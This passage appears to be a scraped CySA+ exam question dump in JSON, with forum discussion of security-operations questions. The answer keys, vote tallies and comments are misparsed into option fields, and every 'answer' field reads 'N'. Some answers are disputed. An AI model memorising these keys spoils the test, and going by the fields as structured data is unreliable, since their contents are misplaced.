software?", "options": [{"letter": "A", "text": "Static testing"}, {"letter": "B", "text": "Vulnerability testing"}, {"letter": "C", "text": "Dynamic testing"}, {"letter": "D", "text": "Penetration testing\nCorrect Answer: C\nCommunity vote distribution\nC (67%)                           D (33%)\n  ChopSNap Highly Voted  1 year, 6 months ago\nSelected Answer: D"}, {"letter": "D", "text": "Penetration testing\nSince the source code is not available, static testing and vulnerability scanning are not feasible options. Dynamic testing, while useful, might not be\nsufficient to uncover deep-rooted vulnerabilities.\nPenetration testing is the most suitable approach in this case. It involves simulating real-world attacks to identify and exploit vulnerabilities in the\napplication. This approach doesn't require access to the source code and can reveal critical security flaws that other testing methods might miss.\nupvoted 7 times\n  ybyttv 11 months, 3 weeks ago\nwhy the vulnerability testing need source code?\nupvoted 1 times\n  5134674 Highly Voted  1 year, 5 months ago\nSelected Answer: C\nPen testing is quite evasive and expansive, but not correct answer in this scenario, since the app is in its Pilot phase.\nupvoted 5 times\n  magmadiver1937 Most Recent  5 months, 3 weeks ago\nSelected Answer: C\nI chose C but I am not entirely confident. Static is a definite no because you dont have access to the code. Vulnerability Testing is a possible choice\nbut that would only find CVEs; an App could have no CVEs but still not be secure. Dynamic testing is when you test by using it which could involve\nsecurity tests. Pentesting also makes sense but it overlaps with Dynamic testing, i.e., you are testing for security problems or misconfiguration by\ninteracting with it, and the term is more broad. In the real world if you had to do a security test for a new WebApp, you would say pentest or WebApp\npentest, only devs say Dynamic Testing, but for this exam I think Dynamic Testing would be how CompTIA brain would answer.\nupvoted 2 times\n  1chung 8 months, 3 weeks ago\nSelected Answer: C\nCorrect answer is C\nupvoted 1 times\n  Popeyes_Chicken 1 year, 4 months ago\nSelected Answer: C\nSource code isn't available, dynamic testing definitely fits better due to it's broad nature. Assessing the application during runtime will allow you to\ncheck for issues with input validation, improper session handling and memory leaks or crashes. Penetration testing is usually done after broader\ntesting such as dynamic testing.\nupvoted 3 times\n  remoteeee 1 year, 4 months ago\nSelected Answer: C\nDynamic testing evaluates an application while it is running, simulating real-world usage to identify vulnerabilities such as SQL injection, cross-site\nscripting (XSS), or authentication flaws. Since the source code is unavailable (black-box scenario), dynamic testing is an effective way to assess the\nsecurity of the application without needing to analyze its internal structure.\nupvoted 2 times\n  KANKALE 1 year, 5 months ago\nSelected Answer: C\nAnswer is dynamic testing\nupvoted 2 times\n  luiiizsoares 1 year, 5 months ago\nSelected Answer: C\nCorrect Answer: C. Dynamic testing\nAnalysis: Given that the application's source code is not available, dynamic testing is an appropriate method to evaluate the security of the software.\nDynamic testing involves analyzing the application by executing it and observing its behavior during runtime, which allows for the identification of\nsecurity vulnerabilities that may not be evident through code inspection alone.\nupvoted 4 times\n  zecomeia_007 1 year, 6 months ago\nSelected Answer: D\nPenetration testing simulates real-world attacks to identify vulnerabilities and assess the overall security posture of the application.\nupvoted 2 times\n  SheikS 1 year, 6 months ago\nD Penetration testing\nPenetration testing simulates real-world attacks on the application to identify vulnerabilities that could be exploited by an attacker. This method\ndoesn't require access to the source code and is effective in assessing the security of the application in its operational environment.\nupvoted 2 times"}], "answer": "N"}, {"id": 294, "question": "A security team needs to demonstrate how prepared the team is in the event of a cyberattack. Which of the following would best demonstrate a\nreal-world incident without impacting operations?", "options": [{"letter": "A", "text": "Review lessons-learned documentation and create a playbook."}, {"letter": "B", "text": "Gather all internal incident response party members and perform a simulation."}, {"letter": "C", "text": "Deploy known malware and document the remediation process."}, {"letter": "D", "text": "Schedule a system recovery to the DR site for a few applications.\nCorrect Answer: B\nCommunity vote distribution\nB (100%)\n  ChopSNap Highly Voted  1 year, 6 months ago\nSelected Answer: B"}, {"letter": "B", "text": "Gather all internal incident response party members and perform a simulation.\nA simulation exercise is the best way to test the team's preparedness and response capabilities in a controlled environment. It allows the team to\npractice:\nCommunication and coordination: How well team members work together\nIncident handling procedures: Following established protocols\nDecision-making: Making timely and effective decisions under pressure\nTool usage: Effectively utilizing security tools and technologies\nIncident documentation: Recording actions and lessons learned\nupvoted 6 times\n  magmadiver1937 Most Recent  5 months, 3 weeks ago\nSelected Answer: B\nAgreed with ChopSNap.\nupvoted 2 times"}], "answer": "N"}, {"id": 295, "question": "A SOC receives several alerts indicating user accounts are connecting to the company’s identity provider through non-secure communications.\nUser credentials for accessing sensitive, business-critical systems could be exposed. Which of the following logs should the SOC use when\ndetermining malicious intent?", "options": [{"letter": "A", "text": "DNS"}, {"letter": "B", "text": "tcpdump"}, {"letter": "C", "text": "Directory"}, {"letter": "D", "text": "IDS\nCorrect Answer: C\nCommunity vote distribution\nB (38%)                   D (38%)            C (24%)\n  linkmonkey239 Highly Voted  1 year, 6 months ago\nSelected Answer: B\ntcpdump. The keyword is \"non-secured communication\". tcpdump allows you to analyze the \"malicious intent\" over a \"non-secured communication\"\nas the traffic is readable.\nupvoted 12 times\n  Susan4041 Highly Voted  1 year, 1 month ago\nSelected Answer: C\nWhy would you not check Directory these are user accounts\nupvoted 5 times\n  1chung Most Recent  8 months, 4 weeks ago\nSelected Answer: B\nI go with B\nupvoted 1 times\n  Superash 9 months, 2 weeks ago\nSelected Answer: C\nDirectory logs (such as Active Directory or Azure AD) contain:\n• Login attempts (success/failure)\n• Login sources (IP address or device)\n• Timing of attempts and their patterns\nupvoted 1 times\n  cj207800 11 months, 2 weeks ago\nSelected Answer: D\nIDS logs (Intrusion Detection System) are specifically designed to detect and log suspicious network activity, such as attempts to exploit non-secure\nchannels. IDS can flag when sensitive data (like credentials) are transmitted insecurely or when known attack patterns are detected over the network.\nupvoted 2 times\n  kmicic77 11 months, 3 weeks ago\nSelected Answer: C\nThe alert is about user accounts authenticating to the identity provider (IdP) over an insecure channel. To judge whether those connections are\nbenign (misconfiguration) or part of an attack, the SOC needs to see who logged in, from where, how often, with what result, and over which protocol\n—all of which are captured in directory/IdP logs (e.g., Active Directory, Azure AD)\nupvoted 1 times\n  ybyttv 11 months, 3 weeks ago\nthen authentication may not necessary happen on AD or windows system\nupvoted 1 times\n  JayWeston 10 months ago\nI have never heard of Active Directory being shortened to directory. When I googled directory logs the AI overview did talk about directory logs as a\nthing, but when going to the source documentation the only referenced was active directory logs. This seems like an AI hallucination.\nupvoted 1 times\n  zecomeia_007 1 year, 6 months ago\nSelected Answer: D"}, {"letter": "D", "text": "IDS (Intrusion Detection System) logs\nIDS logs are specifically designed to detect and log potentially malicious activity.\nupvoted 4 times\n  Cimoooooo 1 year, 6 months ago\nD - IDS. Best choice for detecting Malicious activity.\nupvoted 4 times\n  JayWeston 10 months ago\nThe exam question asks about non-secure communications not malicious activity.\nupvoted 1 times\n  c4cc596 1 week, 4 days ago\nThe last thing it asks about is malicious intent\nupvoted 1 times\n  ChopSNap 1 year, 6 months ago\nSelected Answer: D"}, {"letter": "D", "text": "IDS\nAn Intrusion Detection System (IDS) is designed to monitor network traffic for malicious activity. In this case, an IDS can detect non-secure\nconnections to the identity provider, potentially indicating malicious intent. By analyzing the traffic patterns, the IDS can provide valuable insights into\nthe nature of the attack, such as the source IP address, the affected user accounts, and the specific vulnerabilities exploited.\nWhile DNS, tcpdump, and directory logs can provide useful information, they are not specifically designed to detect malicious intent. DNS logs can\nshow domain resolution, tcpdump can capture network traffic, and directory logs can show user authentication attempts, but they may not provide the\nlevel of context and threat intelligence that an IDS can offer.\nupvoted 5 times"}], "answer": "N"}, {"id": 296, "question": "A vulnerability scan of a web server that is exposed to the internet was recently completed. A security analyst is reviewing the resulting vector\nstrings:\nWhich of the following vulnerabilities should be patched first?", "options": [{"letter": "A", "text": "Vulnerability 1"}, {"letter": "B", "text": "Vulnerability 2"}, {"letter": "C", "text": "Vulnerability 3"}, {"letter": "D", "text": "Vulnerability 4\nCorrect Answer: A\nCommunity vote distribution\nA (100%)\n  thisguyfucks Highly Voted  1 year, 6 months ago\nSelected Answer: A\nNetwork attack vector.\nupvoted 8 times\n  noa808a Most Recent  1 year, 1 month ago\nSelected Answer: A\nA is the correct answer, Network attack vector and High Confidentiality impact should be remediated immediately.\nupvoted 3 times"}], "answer": "N"}, {"id": 297, "question": "Each time a vulnerability assessment team shares the regular report with other teams, inconsistencies regarding versions and patches in the\nexisting infrastructure are discovered. Which of the following is the best solution to decrease the inconsistencies?", "options": [{"letter": "A", "text": "Implementing credentialed scanning"}, {"letter": "B", "text": "Changing from a passive to an active scanning approach"}, {"letter": "C", "text": "Implementing a central place to manage IT assets"}, {"letter": "D", "text": "Performing agentless scanning\nCorrect Answer: C\nCommunity vote distribution\nC (80%)                           B (20%)\n  ChopSNap Highly Voted  1 year, 6 months ago\nSelected Answer: C"}, {"letter": "C", "text": "Implementing a central place to manage IT assets\nA central IT asset management system will provide a single source of truth for all IT assets, including their versions, patches, and configurations. By\nmaintaining accurate and up-to-date information, the vulnerability assessment team can identify inconsistencies and prioritize remediation efforts\nmore effectively.\nHere's why the other options are less effective:"}, {"letter": "A", "text": "Implementing credentialed scanning: While credentialed scanning can provide more accurate vulnerability information, it won't address the\nunderlying issue of inconsistent asset information."}, {"letter": "B", "text": "Changing from a passive to an active scanning approach: This might provide more detailed information but won't directly address the\ninconsistency problem."}, {"letter": "D", "text": "Performing agentless scanning: Agentless scanning can be less intrusive but may not provide as comprehensive information as agent-based\nscanning.\nupvoted 7 times\n  JayWeston 10 months ago\nIf you don't know the answer don't just throw it into AI. The issue that is being asked is about \"inconsistencies regarding versions and patches\" not\n\"underlying issue of inconsistent asset information\" (why answer A is thrown out) or asking for \"single source of truth\" (why C was chosen).\nupvoted 3 times\n  3be4e12 Most Recent  9 months ago\nSelected Answer: C\nVersions and patching = credentialed scanning\nupvoted 1 times\n  3be4e12 9 months ago\nMeant B\nupvoted 1 times\n  3be4e12 9 months ago\nMeant A\nupvoted 1 times\n  JayWeston 10 months ago\nSelected Answer: B\nThis is A or B as both non credentialed scans and passive scans can produce inconsistent scan results.\nSince the question only asked about versioning being inconsistent and not the inconsistent scan of assets or reporting of assets then centralizing\nmanaging the IT assets would not help.\nupvoted 2 times"}], "answer": "N"}, {"id": 298, "question": "An organization plans to use an advanced machine-learning tool as a central collection server. The tool will perform data aggregation and\nanalysis. Which of the following should the organization implement?", "options": [{"letter": "A", "text": "SIEM"}, {"letter": "B", "text": "Firewalls"}, {"letter": "C", "text": "Syslog server"}, {"letter": "D", "text": "Flow analysis\nCorrect Answer: A\nCommunity vote distribution\nA (100%)\n  magmadiver1937 5 months, 3 weeks ago\nSelected Answer: A\nUse process of elimination: Firewall is a no, flow analysis is a no (also does anyone use this phrase in security), syslog server can collect system logs\nor audit logs but typically they do not use ML to analyze the logs. That leaves A left; most SIEMs also advertise as using ML.\nupvoted 2 times\n  Popeyes_Chicken 1 year, 4 months ago\nSelected Answer: A"}, {"letter": "A", "text": "SIEM - Keyword: Aggregation\nupvoted 3 times"}], "answer": "N"}, {"id": 299, "question": "A vulnerability analyst is writing a report documenting the newest, most critical vulnerabilities identified in the past month. Which of the following\npublic MITRE repositories would be best to review?", "options": [{"letter": "A", "text": "Cyber Threat Intelligence"}, {"letter": "B", "text": "Common Vulnerabilities and Exposures"}, {"letter": "C", "text": "Cyber Analytics Repository"}, {"letter": "D", "text": "ATT&CK\nCorrect Answer: B\nCommunity vote distribution\nB (100%)\n  ChopSNap Highly Voted  1 year, 6 months ago\nSelected Answer: B"}, {"letter": "B", "text": "Common Vulnerabilities and Exposures (CVE)\nThe CVE database is a widely recognized repository for standardized identifiers and descriptions of publicly known information security\nvulnerabilities.\nIt's the go-to resource for vulnerability analysts to stay informed about the latest threats. By reviewing the CVE database, the analyst can identify the\nmost critical vulnerabilities that have emerged in the past month and prioritize remediation efforts.\nupvoted 6 times"}], "answer": "N"}, {"id": 300, "question": "A corporation wants to implement an agent-based endpoint solution to help:\n• Flag various threats\n• Review vulnerability feeds\n• Aggregate data\n• Provide real-time metrics by using scripting languages\nWhich of the following tools should the corporation implement to reach this goal?", "options": [{"letter": "A", "text": "DLP"}, {"letter": "B", "text": "Heuristics"}, {"letter": "C", "text": "SOAR"}, {"letter": "D", "text": "NAC\nCorrect Answer: C\nCommunity vote distribution\nC (100%)\n  magmadiver1937 5 months, 3 weeks ago\nSelected Answer: C\nNAC is network access control which blocks or allow devices on the network so no. DLP monitors for data exfiltration so no. Heuristics refers to a\ngeneral detection method so no. SOAR is the only choice left.\nupvoted 2 times\n  Popeyes_Chicken 1 year, 4 months ago\nSelected Answer: C\nThe agent-based endpoint solution combined with requirements like data aggregation, vulnerability feeds, and scripting capabilities aligns well with\nthe functionality provided by SOAR.\nupvoted 2 times"}], "answer": "N"}, {"id": 301, "question": "A new SOC manager reviewed findings regarding the strengths and weaknesses of the last tabletop exercise in order to make improvements.\nWhich of the following should the SOC manager utilize to improve the process?", "options": [{"letter": "A", "text": "The most recent audit report"}, {"letter": "B", "text": "The incident response playbook"}, {"letter": "C", "text": "The incident response plan"}, {"letter": "D", "text": "The lessons-learned register\nCorrect Answer: D\nCommunity vote distribution\nD (100%)\n  iliecomptia 1 year, 1 month ago\nSelected Answer: D\nFrom study guide page 160:\nIncident Response Plan Update\nThe conclusions of the lessons learned report should drive changes to incident\nresponse. This might involve small tweaks to procedures, better explanations\nor greater clarity for incident handlers, new templates for communicating with\ntrusted parties, or major changes to the security controls used. Updates to incident\nresponse procedures require updated training and testing programs.\nupvoted 4 times\n  1403ad2 1 year, 3 months ago\nSelected Answer: D\ni think D would be the best to review findings that have input\nupvoted 2 times"}], "answer": "N"}, {"id": 302, "question": "Following an attack, an analyst needs to provide a summary of the event to the Chief Information Security Officer. The summary needs to include\nthe who-what-when information and evaluate the effectiveness of the plans in place. Which of the following incident management life cycle\nprocesses does this describe?", "options": [{"letter": "A", "text": "Business continuity plan"}, {"letter": "B", "text": "Lessons learned"}, {"letter": "C", "text": "Forensic analysis"}, {"letter": "D", "text": "Incident response plan\nCorrect Answer: B\nCommunity vote distribution\nB (100%)\n  HeatSquad77 3 months ago\nSelected Answer: B\nThe correct answer is B. Lessons learned.\nThis activity occurs in the lessons learned (or post-incident activity) phase of the incident management/incident response lifecycle.\nIn standard frameworks like NIST SP 800-61, the final phase involves reviewing the incident after recovery, documenting details (such as who was\ninvolved, what happened, and when key events occurred), analyzing the response, and evaluating the effectiveness of existing plans, controls, and\nprocedures. This often includes preparing summaries or reports for leadership (e.g., the CISO) and capturing improvements for future incidents.\nupvoted 1 times\n  1403ad2 1 year, 3 months ago\nSelected Answer: B\npretty simple answer\nupvoted 3 times"}], "answer": "N"}, {"id": 303, "question": "Which of the following most accurately describes the Cyber Kill Chain methodology?", "options": [{"letter": "A", "text": "It is used to correlate events to ascertain the TTPs of an attacker."}, {"letter": "B", "text": "It is used to ascertain lateral movements of an attacker, enabling the process to be stopped."}, {"letter": "C", "text": "It provides a clear model of how an attacker generally operates during an intrusion and the actions to take at each stage."}, {"letter": "D", "text": "It outlines a clear path for determining the relationships between the attacker, the technology used, and the target.\nCorrect Answer: C\nCommunity vote distribution\nC (70%)                          B (30%)\n  noa808a 1 year, 1 month ago\nSelected Answer: C\nA - this is the Mitre ATTCK framework.\nB - this is technical systems like SIEMS and EDRs.\nC - this is the cyber kill chain.\nD- this is the diamond analysis.\nupvoted 1 times\n  iliecomptia 1 year, 1 month ago\nSelected Answer: C\nFrom study guide: Kill chain analysis can identify a defensive course of action to counter the\nprogression of an attack. Security teams must understand the kill chain stages to\nrecognize how far suspicious activity has progressed.\nD only mentions lateral movement, which is just one part of an intrusion.\nupvoted 2 times\n  iliecomptia 1 year, 1 month ago\nI meant to say B\nupvoted 1 times\n  ada26b1 1 year, 1 month ago\nSelected Answer: B\nI believe it is B\nupvoted 2 times\n  4ee1800 1 year, 1 month ago\nSelected Answer: C\nThe Cyber Kill Chain is a proactive defense model that focuses on breaking the chain at any stage to stop an attack.\nIt provides a clear view of how an attacker typically progresses through an attack, from reconnaissance to data exfiltration.\nupvoted 4 times\n  1403ad2 1 year, 3 months ago\nSelected Answer: B\ni think its B because C & D mentions how to combat the attack which isnt in cyber kill chain. It just ascertains what the attacker is doing nothing\nmore. And the English in A uses \"correlate event\" which I dont think you would use for cyber kill chain.\nupvoted 1 times"}], "answer": "N"}, {"id": 304, "question": "After a recent vulnerability report for a server is presented, a business must decide whether to secure the company’s web-based storefront or shut\nit down. The developer is not able to fix the zero-day vulnerability because a patch does not exist yet. Which of the following is the best option for\nthe business?", "options": [{"letter": "A", "text": "Limit the API request for new transactions until a patch exists."}, {"letter": "B", "text": "Take the storefront offline until a patch exists."}, {"letter": "C", "text": "Identify the degrading functionality."}, {"letter": "D", "text": "Put a WAF in front of the storefront.\nCorrect Answer: D\nCommunity vote distribution\nD (100%)\n  mikeyou2017 Highly Voted  1 year, 6 months ago\nput WAF (web application firewall)a security tool that protects web applications by monitoring and filtering traffic from the internet\nupvoted 9 times\n  JacksonTrite 1 year, 5 months ago\nA WAF enforces input validation rules, which prevent attackers from sending malicious payloads to the application:\nFilters or sanitizes requests for SQL, XSS, and other injection attempts.\nBlocks unauthorized file uploads or parameter tampering.\nupvoted 5 times\n  HeatSquad77 Most Recent  3 months ago\nSelected Answer: D\nThe correct answer is D. Put a WAF in front of the storefront.\nThis is the best option in the context of a CompTIA CySA+ (CS0-003) scenario involving a zero-day vulnerability in a public-facing web-based\nstorefront where no patch exists yet.\nA Web Application Firewall (WAF) provides immediate, compensating protection by inspecting and filtering HTTP/HTTPS traffic in real time. It can\nblock known exploit patterns, anomalous behavior, or signatures/rules associated with the reported vulnerability (even for zero-days, through\nbehavioral rules, rate limiting, or virtual patching). Many sources, including security best practices and CySA+-related materials, highlight WAFs as a\nstrong mitigation for zero-day exploits in web applications while awaiting a vendor patch.\nupvoted 1 times\n  Susan4041 1 year, 1 month ago\nSelected Answer: D\nPut a WAF\nupvoted 3 times"}], "answer": "N"}, {"id": 305, "question": "During a tabletop exercise, engineers discovered that an ICS could not be updated due to hardware versioning incompatibility. Which of the\nfollowing is the most likely cause of this issue?", "options": [{"letter": "A", "text": "Legacy system"}, {"letter": "B", "text": "Business process interruption"}, {"letter": "C", "text": "Degrading functionality"}, {"letter": "D", "text": "Configuration management\nCorrect Answer: A\nCommunity vote distribution\nA (100%)\n  HeatSquad77 3 months ago\nSelected Answer: A\nThe correct answer is A. Legacy system.\nIn the context of a CompTIA CySA+ (CS0-003) exam question, the scenario describes an Industrial Control System (ICS) that cannot receive updates\nbecause of hardware versioning incompatibility discovered during a tabletop exercise.\nThis is a classic characteristic of legacy systems — older, often specialized industrial hardware (common in ICS/OT environments) that uses outdated\ncomponents, proprietary firmware, or specific hardware revisions no longer supported or compatible with current patches, software updates, or newer\ndrivers/firmware versions. Legacy ICS frequently cannot be patched without risking operational failure or requiring full hardware replacement, which\nis why compensating controls, air-gapping, or monitoring are emphasized instead.\nupvoted 1 times\n  1403ad2 1 year, 3 months ago\nSelected Answer: A\npay attention to the wording, key word here is \"could not be updated due to hardware......\" meaning its just old.\nupvoted 3 times"}], "answer": "N"}, {"id": 306, "question": "Which of the following is the best reason to implement an MOU?", "options": [{"letter": "A", "text": "To create a business process for configuration management"}, {"letter": "B", "text": "To allow internal departments to understand security responsibilities"}, {"letter": "C", "text": "To allow an expectation process to be defined for legacy systems"}, {"letter": "D", "text": "To ensure that all metrics on service levels are properly reported\nCorrect Answer: B\nCommunity vote distribution\nB (100%)\n  drbrain 6 months, 2 weeks ago\nSelected Answer: B"}, {"letter": "B", "text": "To allow internal departments to understand security responsibilities\nMemorandum of Understanding (MOU): A formal document that outlines mutual goals, expectations, and responsibilities between two or more\nparties, often used to establish partnerships. It serves as a framework for cooperation, ensuring clarity and mutual understanding, especially in\ncontexts involving data sharing or collaborative projects.\nupvoted 2 times\n  ada26b1 1 year, 1 month ago\nSelected Answer: B\nI believe it is B as it outlines present intentions, roles, and objectives, serving as a mutual acknowledgment of potential outcomes and processes.\nupvoted 4 times"}], "answer": "N"}, {"id": 307, "question": "Which of the following documents sets requirements and metrics for a third-party response during an event?", "options": [{"letter": "A", "text": "BIA"}, {"letter": "B", "text": "DRP"}, {"letter": "C", "text": "SLA"}, {"letter": "D", "text": "MOU\nCorrect Answer: C\nCommunity vote distribution\nC (100%)\n  1403ad2 1 year, 3 months ago\nSelected Answer: C\npretty simple SLA is an writing service level agreement to uphold something\nupvoted 4 times"}], "answer": "N"}, {"id": 308, "question": "A SOC analyst wants to improve the proactive detection of malicious emails before they are delivered to the destination inbox. Which of the\nfollowing is the best approach the SOC analyst can recommend?", "options": [{"letter": "A", "text": "Install UEBA software on the network."}, {"letter": "B", "text": "Validate and quarantine emails with invalid DKIM and SPF headers."}, {"letter": "C", "text": "Implement an EDR system on each endpoint."}, {"letter": "D", "text": "Deploy a DLP platform to block unauthorized and suspicious content.\nCorrect Answer: B\nCommunity vote distribution\nB (100%)\n  ada26b1 1 year, 1 month ago\nSelected Answer: B\nEasy question deffo B\nupvoted 3 times\n  1403ad2 1 year, 3 months ago\nSelected Answer: B\n\"proactive detection of malicious emails\" DKIM and SPF would be the best and most specific check for emails.\nupvoted 3 times"}], "answer": "N"}, {"id": 309, "question": "Which of the following is a benefit of the Diamond Model of Intrusion Analysis?", "options": [{"letter": "A", "text": "It provides analytical pivoting and identifies knowledge gaps."}, {"letter": "B", "text": "It guarantees that the discovered vulnerability will not be exploited again in the future."}, {"letter": "C", "text": "It provides concise evidence that can be used in court."}, {"letter": "D", "text": "It allows for proactive detection and analysis of attack events.\nCorrect Answer: A\nCommunity vote distribution\nA (100%)\n  bufffalobilll Highly Voted  1 year, 5 months ago\nSelected Answer: A\n\"The Diamond Model of Intrusion Analysis is a framework that helps analysts to understand the relationships between the adversary, the victim, the\ninfrastructure, and the capability involved in an attack. It also enables analytical pivoting, which is the process of moving from one piece of\ninformation to another related one, and identifies knowledge gaps that need further investigation.\"\nupvoted 12 times"}], "answer": "N"}, {"id": 310, "question": "An incident responder was able to recover a binary file through the network traffic. The binary file was also found in some machines with\nanomalous behavior. Which of the following processes most likely can be performed to understand the purpose of the binary file?", "options": [{"letter": "A", "text": "File debugging"}, {"letter": "B", "text": "Traffic analysis"}, {"letter": "C", "text": "Reverse engineering"}, {"letter": "D", "text": "Machine isolation\nCorrect Answer: C\nCommunity vote distribution\nC (83%)                           A (17%)\n  HeatSquad77 3 months ago\nSelected Answer: C\nThe correct answer is C. Reverse engineering.\nIn the context of CompTIA CySA+ (CS0-003), when an incident responder recovers a suspicious binary file (e.g., from captured network traffic or\nanomalous endpoint behavior), the primary process to determine its purpose, functionality, capabilities, or malicious intent is reverse engineering.\nReverse engineering involves techniques such as:\nDisassembling the binary (converting machine code to assembly)\nDecompiling (attempting to recover higher-level code)\nStatic analysis (examining strings, imports, resources, headers without execution)\nDynamic analysis (running in a sandbox/debugger to observe behavior)\nupvoted 1 times\n  fafd232_ 1 year, 1 month ago\nSelected Answer: C\nI'm going with C because:\n- Reverse engineering is a common answer to CySa+ practice questions pertaining to investigating binary files\n- I haven't seen anything in my study material, nor the objectives, regarding \"File Debugging.\"\n- ChatGPT (o1 model) said the answer is C, Reverse Engineering\nupvoted 4 times\n  1403ad2 1 year, 3 months ago\nSelected Answer: A\nfile debugging for a file binary makes the sense to me. I would like to hear why it could be reverse engineering but i think it would too hard when file\ndebugging can be used.\nupvoted 1 times\n  noa808a 1 year, 1 month ago\nFile debugging would be pointless unless you are trying to find coding/runtime errors in the binary file. Reverse engineering is the correct answer.\nupvoted 2 times"}], "answer": "N"}, {"id": 311, "question": "A manufacturing company’s assembly line machinery only functions on an end-of-life OS. Consequently, no patches exist for several highly\nexploitable OS vulnerabilities. Which of the following is the best mitigating control to reduce the risk of these current conditions?", "options": [{"letter": "A", "text": "Enforce strict network segmentation to isolate vulnerable systems from the production network."}, {"letter": "B", "text": "Increase the system resources for vulnerable devices to prevent denial of service."}, {"letter": "C", "text": "Perform penetration testing to verify the exploitability of these vulnerabilities."}, {"letter": "D", "text": "Develop in-house patches to address these vulnerabilities.\nCorrect Answer: A\nCommunity vote distribution\nA (100%)\n  1403ad2 Highly Voted  1 year, 3 months ago\nSelected Answer: A\nA makes the most sense to segment from everything as best as you can when it is highly exploitable vulnerabilities. I think this is a obvious one.\nupvoted 6 times"}], "answer": "N"}, {"id": 312, "question": "Which of the following will most likely cause severe issues with authentication and logging?", "options": [{"letter": "A", "text": "Virtualization"}, {"letter": "B", "text": "Multifactor authentication"}, {"letter": "C", "text": "Federation"}, {"letter": "D", "text": "Time synchronization\nCorrect Answer: D\nCommunity vote distribution\nD (100%)\n  Shawn100 9 months, 1 week ago\nSelected Answer: D\nTime Synchronization\nTime synchronization is the process of coordinating the clocks of different computer systems. If a network's devices, such as servers, firewalls, and\nlogging systems, do not have synchronized clocks, it can cause severe issues with authentication and logging.\nAuthentication\nMany modern authentication protocols, such as Kerberos, are highly dependent on time. Kerberos uses timestamps to prevent replay attacks by\nensuring that authentication tickets are only valid for a specific time window. If the client's clock and the server's clock are out of sync, the client's\nrequest will likely be rejected, leading to an authentication failure.\nLogging\nLogging is crucial for security monitoring and incident response. If the timestamps on log entries from different devices are not synchronized, it\nbecomes nearly impossible to accurately reconstruct a sequence of events during a security incident. An analyst trying to piece together a timeline of\nan attack would see a jumble of events with incorrect timestamps, making it difficult to identify the root cause or the spread of the attack.\nupvoted 3 times\n  1403ad2 1 year, 3 months ago\nSelected Answer: D\npretty simple one, TTL (time to live) of packets or request will die before they get to you and time zone difference may lock you out\nupvoted 4 times"}], "answer": "N"}, {"id": 313, "question": "Several critical bugs were identified during a vulnerability scan. The SLA risk requirement is that all critical vulnerabilities should be patched within\n24 hours. After sending a notification to the asset owners, the patch cannot be deployed due to planned, routine system upgrades. Which of the\nfollowing is the best method to remediate the bugs?", "options": [{"letter": "A", "text": "Reschedule the upgrade and deploy the patch."}, {"letter": "B", "text": "Request an exception to exclude the patch from installation."}, {"letter": "C", "text": "Update the risk register and request a change to the SLA."}, {"letter": "D", "text": "Notify the incident response team and rerun the vulnerability scan.\nCorrect Answer: A\nCommunity vote distribution\nA (80%)                        C (10%) D (10%)\n  Ranaer 3 months, 4 weeks ago\nSelected Answer: A\nEveryone thinking there is no contest here between A and C has clearly never worked in a place, where schedule is above all else. In the stupid\nCOMPTIA terms A might be a better choice indeed, but in real life situation C is perfectly reasonable answer too.\nupvoted 2 times\n  azuredemo2022three 7 months ago\nSelected Answer: A\nCritical vulnerabilities must be patched within the SLA window to prevent exploitation. Security risk outweighs the operational inconvenience of\nrescheduling planned upgrades.\nupvoted 2 times\n  JayWeston 10 months ago\nSelected Answer: C\nBoth A and C seem like valid answers to me. It does not seem unreasonable to request the SLA for these vulnerabilities to be extended to 48 hours to\naccommodate a planned update. What is the business impact to cancel the upgrade and reschedule it?\nupvoted 1 times\n  ybyttv 11 months, 3 weeks ago\nSelected Answer: D\nI would like the system do the upgrade. (Lots of upgrade includes the patches). After upgrade, return vulnerability\nupvoted 1 times\n  ybyttv 11 months, 3 weeks ago\nOK, I think I was wrong. There is no reason to notify \"incident response team\".\nupvoted 1 times\n  1403ad2 1 year, 3 months ago\nSelected Answer: A\n\"Several critical bugs\" were found and the \"SLA risk requirement is....critical vulnerabilities should be patched within 24 hours.\" the answer is to\nreschedule updates and prioritize the patching.\nupvoted 4 times"}], "answer": "N"}, {"id": 314, "question": "A company is in the middle of an incident, and customer data has been breached. Which of the following should the company contact first?", "options": [{"letter": "A", "text": "Media"}, {"letter": "B", "text": "Public relations"}, {"letter": "C", "text": "Law enforcement"}, {"letter": "D", "text": "Legal\nCorrect Answer: D\nCommunity vote distribution\nD (89%)                        B (11%)\n  noa808a 1 year, 1 month ago\nSelected Answer: D\nAlways contact legal first before anyone else regarding disclosure, as they are the experts at what needs to happen and when.\nupvoted 2 times\n  mcoco35_111 1 year, 1 month ago\nSelected Answer: D"}, {"letter": "D", "text": "Legal.\nHere's why:\nLegal Obligations & Privilege: Immediately involving the legal team is crucial to understand the company's legal and regulatory obligations (like GDPR,\nCCPA, state breach notification laws, etc.). Communications under the direction of legal counsel may also be protected by attorney-client privilege,\nwhich is vital during investigations and potential litigation.\nGuiding the Response: The legal team will guide the entire incident response process, including advising on internal investigations, evidence\npreservation, coordination with forensic teams, determining notification requirements, and managing liability.\nCoordinating Other Communications: Legal counsel will advise on when and how to contact other parties, including law enforcement, public relations,\nregulators, and affected customers.\nupvoted 3 times\n  ada26b1 1 year, 1 month ago\nSelected Answer: D\nThe legal team should be contacted first to ensure that the company responds appropriately, remains compliant with applicable laws, and avoids\nexacerbating the situation legally. They will then help coordinate the involvement of other teams, such as public relations or law enforcement, as\nneeded.\nupvoted 3 times\n  ada26b1 1 year, 1 month ago\nSelected Answer: B\nI believe it is B as it involves proactive engagement with stakeholders, including customers, employees, regulators, and the media.\nupvoted 1 times\n  Susan4041 1 year ago\nThe legal team is the one that advises why would you want go to media, customers, and employees first?\nupvoted 1 times"}], "answer": "N"}, {"id": 315, "question": "A list of IoCs released by a government security organization contains the SHA-256 hash for a Microsoft-signed legitimate binary, svchost.exe.\nWhich of the following best describes the result if security teams add this indicator to their detection signatures?", "options": [{"letter": "A", "text": "This indicator would fire on the majority of Windows devices."}, {"letter": "B", "text": "Malicious files with a matching hash would be detected."}, {"letter": "C", "text": "Security teams would detect rogue svchost.exe processes in their environment."}, {"letter": "D", "text": "Security teams would detect event entries detailing execution of known-malicious svchost.exe processes.\nCorrect Answer: A\nCommunity vote distribution\nA (71%)                            B (29%)\n  Kacy01 2 months, 2 weeks ago\nSelected Answer: B\nwith the introduction of SHA-256 hash it will help identify other malicious Malware files with the same hash. I believe answer should be B\nupvoted 1 times\n  BadoBully 1 year, 1 month ago\nSelected Answer: A\nOnly one that makes sense\nupvoted 3 times\n  ada26b1 1 year, 1 month ago\nSelected Answer: A\nI believe it is A can someone confirm ?\nupvoted 2 times\n  erfanse 1 